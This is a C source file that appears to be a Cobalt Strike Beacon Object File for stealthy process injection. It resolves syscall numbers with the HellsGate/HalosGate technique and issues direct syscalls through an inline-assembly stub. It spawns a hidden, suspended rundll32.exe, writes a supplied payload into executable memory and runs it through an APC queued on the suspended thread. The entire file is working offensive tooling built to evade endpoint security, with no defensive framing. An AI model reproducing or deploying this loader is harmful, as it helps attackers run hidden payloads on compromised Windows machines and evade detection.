#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"

// ========== SYSCALL DEFINITIONS ==========
// HellsGate/HalosGate pattern for syscall number resolution

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

typedef NTSTATUS (NTAPI *pNtResumeThread)(
    HANDLE ThreadHandle,
    PULONG SuspendCount
);

// HellsGate pattern - find syscall number
DWORD getSyscallNumber(PVOID functionAddress) {
    BYTE* addr = (BYTE*)functionAddress;

    // Check for syscall pattern: mov r10, rcx; mov eax, <ssn>
    if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 &&
        addr[3] == 0xB8) {
        // Extract SSN from bytes 4-7
        return *(DWORD*)(addr + 4);
    }

    // Try HalosGate (check neighbors)
    for (int i = 1; i <= 5; i++) {
        // Check down
        BYTE* down = addr - (i * 0x20);
        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
            DWORD ssn = *(DWORD*)(down + 4);
            return ssn + i;
        }

        // Check up
        BYTE* up = addr + (i * 0x20);
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
            DWORD ssn = *(DWORD*)(up + 4);
            return ssn - i;
        }
    }

    return 0;
}

// Syscall stub - x64 only
// Signature: HellsGate_syscall(SSN, arg1, arg2, arg3, arg4, arg5, arg6)
// Shuffles arguments to proper syscall positions
#if defined _M_X64 || defined __x86_64__
__asm__(
"HellsGate_syscall:            \n"
    // Input: rcx=SSN, rdx=arg1, r8=arg2, r9=arg3, [rsp+0x28]=arg4, [rsp+0x30]=arg5, [rsp+0x38]=arg6
    // Need: eax=SSN, r10=arg1, rdx=arg2, r8=arg3, r9=arg4, [rsp+0x28]=arg5, [rsp+0x30]=arg6
    "movl %ecx, %eax           \n"  // eax = SSN
    "movq %rdx, %r10           \n"  // r10 = arg1 (syscall convention)
    "movq %r8, %rdx            \n"  // rdx = arg2
    "movq %r9, %r8             \n"  // r8 = arg3
    "movq 0x28(%rsp), %r9      \n"  // r9 = arg4 (from stack)
    // Shift stack arguments down: arg5 -> [rsp+0x28], arg6 -> [rsp+0x30]
    "movq 0x30(%rsp), %r11     \n"  // r11 = arg5 (temp)
    "movq %r11, 0x28(%rsp)     \n"  // [rsp+0x28] = arg5
    "movq 0x38(%rsp), %r11     \n"  // r11 = arg6 (temp)
    "movq %r11, 0x30(%rsp)     \n"  // [rsp+0x30] = arg6
    "syscall                   \n"
    "ret                       \n"
);

extern NTSTATUS HellsGate_syscall(DWORD ssn, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5, PVOID arg6);
#else
// x86 stub - no syscall support
NTSTATUS HellsGate_syscall(DWORD ssn, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5, PVOID arg6) {
    return 0;
}
#endif

// ========== CUSTOM INJECTION WITH SYSCALLS ==========

BOOL is_x64() {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}

void go(char * args, int alen, BOOL x86) {
   STARTUPINFOA        si;
   PROCESS_INFORMATION pi;
   datap               parser;
   short               ignoreToken;
   char *              dllPtr;
   int                 dllLen;

   // Extract arguments
   BeaconDataParse(&parser, args, alen);
   ignoreToken = BeaconDataShort(&parser);
   dllPtr = BeaconDataExtract(&parser, &dllLen);

   // Zero out structures
   __stosb((void *)&si, 0, sizeof(STARTUPINFO));
   __stosb((void *)&pi, 0, sizeof(PROCESS_INFORMATION));

   si.dwFlags = STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.cb = sizeof(STARTUPINFO);

   // Step 1: Spawn temporary process (suspended) ourselves
   // Can't use BeaconSpawnTemporaryProcess - it doesn't give us a real handle
   // Spawn appropriate rundll32.exe based on architecture
   char *target = x86 ? "C:\\Windows\\SysWOW64\\rundll32.exe" : "C:\\Windows\\System32\\rundll32.exe";

   if (!KERNEL32$CreateProcessA(
       target,
       NULL,
       NULL,
       NULL,
       FALSE,
       CREATE_SUSPENDED | CREATE_NO_WINDOW,
       NULL,
       NULL,
       &si,
       &pi)) {
      BeaconPrintf(CALLBACK_ERROR, "Failed to spawn %s temporary process", x86 ? "x86" : "x64");
      return;
   }

   BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned %s temporary process - PID: %d",
       x86 ? "x86" : "x64", pi.dwProcessId);

   // Step 2: Custom injection using syscalls (APC injection)
   NTSTATUS status;
   PVOID remoteBuffer = NULL;
   SIZE_T bufferSize = dllLen;
   SIZE_T bytesWritten = 0;

   // Get ntdll base
   HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
   if (!ntdll) {
      BeaconPrintf(CALLBACK_ERROR, "Failed to get ntdll handle");
      BeaconCleanupProcess(&pi);
      return;
   }

   // Resolve syscall functions
   pNtAllocateVirtualMemory NtAllocateVirtualMemory =
       (pNtAllocateVirtualMemory)KERNEL32$GetProcAddress(ntdll, "NtAllocateVirtualMemory");
   pNtWriteVirtualMemory NtWriteVirtualMemory =
       (pNtWriteVirtualMemory)KERNEL32$GetProcAddress(ntdll, "NtWriteVirtualMemory");
   pNtQueueApcThread NtQueueApcThread =
       (pNtQueueApcThread)KERNEL32$GetProcAddress(ntdll, "NtQueueApcThread");
   pNtResumeThread NtResumeThread =
       (pNtResumeThread)KERNEL32$GetProcAddress(ntdll, "NtResumeThread");

   if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtQueueApcThread || !NtResumeThread) {
      BeaconPrintf(CALLBACK_ERROR, "Failed to resolve syscall functions");
      BeaconCleanupProcess(&pi);
      return;
   }

   // Get syscall numbers
   DWORD ssnAlloc = getSyscallNumber((PVOID)NtAllocateVirtualMemory);
   DWORD ssnWrite = getSyscallNumber((PVOID)NtWriteVirtualMemory);
   DWORD ssnApc = getSyscallNumber((PVOID)NtQueueApcThread);
   DWORD ssnResume = getSyscallNumber((PVOID)NtResumeThread);

   // Allocate memory in remote process using syscall
   // NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect)
   status = HellsGate_syscall(
       ssnAlloc,                // SSN (first arg now!)
       pi.hProcess,             // ProcessHandle
       (PVOID)&remoteBuffer,    // BaseAddress
       (PVOID)0,                // ZeroBits
       (PVOID)&bufferSize,      // RegionSize
       (PVOID)(MEM_COMMIT | MEM_RESERVE), // AllocationType
       (PVOID)PAGE_EXECUTE_READWRITE      // Protect
   );

   if (status != 0 || !remoteBuffer) {
      BeaconPrintf(CALLBACK_ERROR, "NtAllocateVirtualMemory failed: 0x%x", status);
      BeaconCleanupProcess(&pi);
      return;
   }

   BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocated %d bytes at 0x%p", bufferSize, remoteBuffer);

   // Write payload to remote process using syscall
   // NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten)
   status = HellsGate_syscall(
       ssnWrite,          // SSN (first arg now!)
       pi.hProcess,       // ProcessHandle
       remoteBuffer,      // BaseAddress
       dllPtr,            // Buffer
       (PVOID)dllLen,     // NumberOfBytesToWrite
       (PVOID)&bytesWritten, // NumberOfBytesWritten
       NULL               // Padding
   );

   if (status != 0) {
      BeaconPrintf(CALLBACK_ERROR, "NtWriteVirtualMemory failed: 0x%x", status);
      BeaconCleanupProcess(&pi);
      return;
   }

   BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote %d bytes to remote process", bytesWritten);

   // Queue APC to execute payload using syscall
   // NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3)
   status = HellsGate_syscall(
       ssnApc,            // SSN (first arg now!)
       pi.hThread,        // ThreadHandle
       remoteBuffer,      // ApcRoutine (our shellcode)
       NULL,              // ApcArgument1
       NULL,              // ApcArgument2
       NULL,              // ApcArgument3
       NULL               // Padding
   );

   if (status != 0) {
      BeaconPrintf(CALLBACK_ERROR, "NtQueueApcThread failed: 0x%x", status);
      BeaconCleanupProcess(&pi);
      return;
   }

   BeaconPrintf(CALLBACK_OUTPUT, "[+] Queued APC to thread %d", pi.dwThreadId);

   // Resume thread to execute APC using syscall
   // NtResumeThread(ThreadHandle, SuspendCount)
   ULONG suspendCount = 0;
   status = HellsGate_syscall(
       ssnResume,         // SSN (first arg now!)
       pi.hThread,        // ThreadHandle
       (PVOID)&suspendCount, // SuspendCount
       NULL,              // Padding
       NULL,              // Padding
       NULL,              // Padding
       NULL               // Padding
   );

   if (status != 0) {
      BeaconPrintf(CALLBACK_ERROR, "NtResumeThread failed: 0x%x", status);
   } else {
      BeaconPrintf(CALLBACK_OUTPUT, "[+] Thread resumed, APC will execute");
   }

   // Cleanup - close handles ourselves since we spawned the process
   KERNEL32$CloseHandle(pi.hThread);
   KERNEL32$CloseHandle(pi.hProcess);
}

void gox86(char * args, int alen) {
   go(args, alen, TRUE);
}

void gox64(char * args, int alen) {
   go(args, alen, FALSE);
}
